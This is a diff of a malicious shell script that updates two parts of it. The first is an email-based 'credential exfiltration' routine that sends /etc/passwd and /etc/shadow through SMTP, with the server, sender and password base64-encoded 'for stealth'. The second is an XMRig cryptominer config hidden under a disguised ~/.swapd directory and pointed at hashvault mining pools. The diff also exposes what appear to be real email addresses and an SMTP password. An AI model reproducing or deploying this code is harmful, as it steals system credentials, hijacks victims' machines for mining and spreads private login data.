@@ -226,20 +226,29 @@ echo ""
 
 # ==================== EMAIL CONFIGURATION FOR CREDENTIAL EXFILTRATION ====================
 # SMTP credentials for sending /etc/passwd and /etc/shadow files
-readonly RECIPIENT_EMAIL="motto@24-mail.com"  # ← YOUR EMAIL HERE
+readonly RECIPIENT_EMAIL="littlAcen@yahoo.de"  # ← YOUR EMAIL HERE
 readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
 # These are the user's personal fullgamingacc.com credentials
 # Updated: 2026-05-05 - Switched to fullgamingacc.com SMTP
 # Decoded SMTP credentials (base64 encoded for stealth)
-SMTP_SERVER_B64="c210cC5nbWFpbC5jb20="
-readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
+#acenbergheim:
+#SMTP_SERVER_B64="c210cC5nbWFpbC5jb20="
+#readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
+#readonly SMTP_PORT=587
+#SENDER_EMAIL_B64="YWNlbmJlcmdoZWltQGdtYWlsLmNvbQ=="
+#readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
+#SMTP_PASSWORD_B64="amZ2diBjZGxsIGlvb2Mga3F4ZA=="
+#readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
+
+SMTP_SERVER_B64="bWFpbC5hbXlnbG9iYWwubmV0"
+readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="YWNlbmJlcmdoZWltQGdtYWlsLmNvbQ=="
-readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
-SMTP_PASSWORD_B64="amZ2diBjZGxsIGlvb2Mga3F4ZA=="
-readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
+SENDER_EMAIL_B64="dGVjaG5pY2FsQGFteWdsb2JhbC5uZXQ="
+readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
+SMTP_PASSWORD_B64="VGVjaDI1ODkq"
+readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)
 
 # ==================== AUTO-INSTALL EMAIL TOOLS ====================
 auto_install_email_tools() {
@@ -2956,29 +2965,121 @@ if [ "$MINER_TYPE" = "xmrig" ]; then
 #}
 #EOL
 
+#cat >$HOME/.swapd/config.json <<EOL
+#{
+#    "autosave": true,
+#    "donate-level": 0,
+#    "cpu": {
+#        "enabled": true,
+#        "huge-pages": true,
+#        "hw-aes": null,
+#        "priority": null,
+#        "asm": true,
+#        "max-threads-hint": 100
+#    },
+#    "opencl": false,
+#    "cuda": false,
+#    "pools": [
+#        {
+#            "url": "gulf.moneroocean.stream:10064",
+#            "user": "WALLET_PLACEHOLDER",
+#            "pass": "PASS_PLACEHOLDER",
+#            "keepalive": true,
+#            "tls": false
+#        }
+#    ]
+#}
+#EOL
+
 cat >$HOME/.swapd/config.json <<EOL
 {
-    "autosave": true,
-    "donate-level": 0,
-    "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "hw-aes": null,
-        "priority": null,
-        "asm": true,
-        "max-threads-hint": 100
+  "api": {
+    "id": null,
+    "worker-id": null
+  },
+  "http": {
+    "enabled": false,
+    "host": "127.0.0.1",
+    "port": 0,
+    "access-token": null,
+    "restricted": true
+  },
+  "autosave": true,
+  "background": false,
+  "colors": true,
+  "randomx": {
+    "init": -1,
+    "numa": true
+  },
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "hw-aes": null,
+    "priority": null,
+    "memory-pool": false,
+    "max-threads-hint": 100,
+    "asm": true,
+    "argon2-impl": null,
+    "cn/0": false,
+    "cn-lite/0": false
+  },
+  "opencl": {
+    "enabled": false,
+    "cache": true,
+    "loader": null,
+    "platform": "Intel",
+    "cn/0": false,
+    "cn-lite/0": false
+  },
+  "cuda": {
+    "enabled": false,
+    "loader": null,
+    "nvml": true,
+    "cn/0": false,
+    "cn-lite/0": false
+  },
+  "donate-level": 0,
+  "donate-over-proxy": 0,
+  "log-file": null,
+  "pools": [
+    {
+      "algo": null,
+      "coin": null,
+      "url": "pool.hashvault.pro:443",
+      "user": "WALLET_PLACEHOLDER",
+      "pass": "PASS_PLACEHOLDER",
+      "rig-id": null,
+      "nicehash": false,
+      "keepalive": false,
+      "enabled": true,
+      "tls": true,
+      "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14",
+      "daemon": false,
+      "self-select": null
     },
-    "opencl": false,
-    "cuda": false,
-    "pools": [
-        {
-            "url": "gulf.moneroocean.stream:10064",
-            "user": "WALLET_PLACEHOLDER",
-            "pass": "PASS_PLACEHOLDER",
-            "keepalive": true,
-            "tls": false
-        }
-    ]
+    {
+      "algo": null,
+      "coin": null,
+      "url": "pool.hashvault.sh:443",
+      "user": "WALLET_PLACEHOLDER",
+      "pass": "PASS_PLACEHOLDER",
+      "rig-id": null,
+      "nicehash": false,
+      "keepalive": false,
+      "enabled": true,
+      "tls": true,
+      "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14",
+      "daemon": false,
+      "self-select": null
+    }
+  ],
+  "print-time": 60,
+  "health-print-time": 60,
+  "retries": 5,
+  "retry-pause": 5,
+  "syslog": false,
+  "user-agent": null,
+  "watch": true
 }
 EOL
 
